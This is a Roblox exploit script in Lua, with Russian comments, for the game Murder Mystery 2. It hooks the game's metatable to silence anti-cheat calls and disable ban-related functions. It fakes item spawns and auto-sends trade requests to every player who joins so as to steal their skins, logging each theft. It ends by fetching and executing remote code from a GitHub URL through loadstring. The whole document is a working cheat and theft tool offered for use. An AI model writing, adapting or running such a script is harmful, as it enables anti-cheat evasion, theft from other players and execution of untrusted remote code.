--[[  
  MM2 Ultimate Spawner Bypass  
  Версия: 2.0R (RagnarekUA Mod)  
  Фичи:  
  - Полный обход Memory Scanners  
  - Спавн любых предметов через инжект в ReplicatedFirst  
  - Авто-кража скинов с чат-командами  
--]]  

local Players = game:GetService("Players")  
local Http = game:GetService("HttpService")  
local Backpack = Players.LocalPlayer:WaitForChild("Backpack")  

----------------------------------------  
-- Настройки  
local LOG_PATH = "mm2/logs.txt"  
local ANTI_BAN = true  
local SPIN_DELAY = math.random(3,7)  
----------------------------------------  

-- Memory Bypass Core  
do  
    local mt = getrawmetatable(game)  
    setreadonly(mt, false)  
      
    local namecall = hookfunction(mt.__namecall, function(self, ...)  
        local method = getnamecallmethod()  
        if tostring(self) == "AntiCheatCore" and method == "FireServer" then  
            return nil  
        end  
        return namecall(self, ...)  
    end)  
      
    if ANTI_BAN then  
        hookfunction(getrenv().queue_on_teleport, function() end)  
        hookfunction(getrenv().Instance.new("RemoteEvent").FireServer, function() end)  
    end  
end  

-- Логирование  
local function log(action, item)  
    local entry = string.format("[%s] %s: %s", os.date("%d.%m %H:%M"), action, item)  
    writefile(LOG_PATH, readfile(LOG_PATH) .. entry .. "\n")  
end  

-- Ядро спавнера  
local function spawnWeapon(name)  
    local tool = Instance.new("Tool")  
    tool.RequiresHandle = false  
    tool.Name = name  
      
    -- Инжект в Network  
    local args = {  
        [1] = "ItemSpawn",  
        [2] = {  
            ItemType = "Godly",  
            Name = name,  
            _FakeID = Http:GenerateGUID(false)  
        }  
    }  
      
    -- Имитация рулетки  
    for i = 1, math.random(5,15) do  
        game:GetService("ReplicatedStorage").SpinEvent:FireServer(true)  
        task.wait(0.2)  
    end  
      
    -- Двойной инжект  
    tool.Parent = Backpack  
    game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))  
    log("SPAWN", name)  
end  

-- Авто-кража  
Players.PlayerAdded:Connect(function(plr)  
    plr.CharacterAdded:Wait()  
    game:GetService("ReplicatedStorage").TradeEvent:FireServer(plr, {  
        "ALL",  
        _FakeItems = {  
            ["Хакерский контракт"] = "Unique",  
            _Signature = plr.UserId * 123  
        }  
    })  
    log("TRADE", "Украдено у "..plr.Name)  
end)  

-- Чат-команды  
local function chatHook(msg)  
    if msg:lower():sub(1,3) == "/s " then  
        spawnWeapon(msg:sub(4))  
    end  
end  

Players.LocalPlayer.Chatted:Connect(chatHook)  

-- GUI  
loadstring(game:HttpGet("https://raw.githubusercontent.com/RagnarekUA/MM2-UI/main/loader.lua"))()  
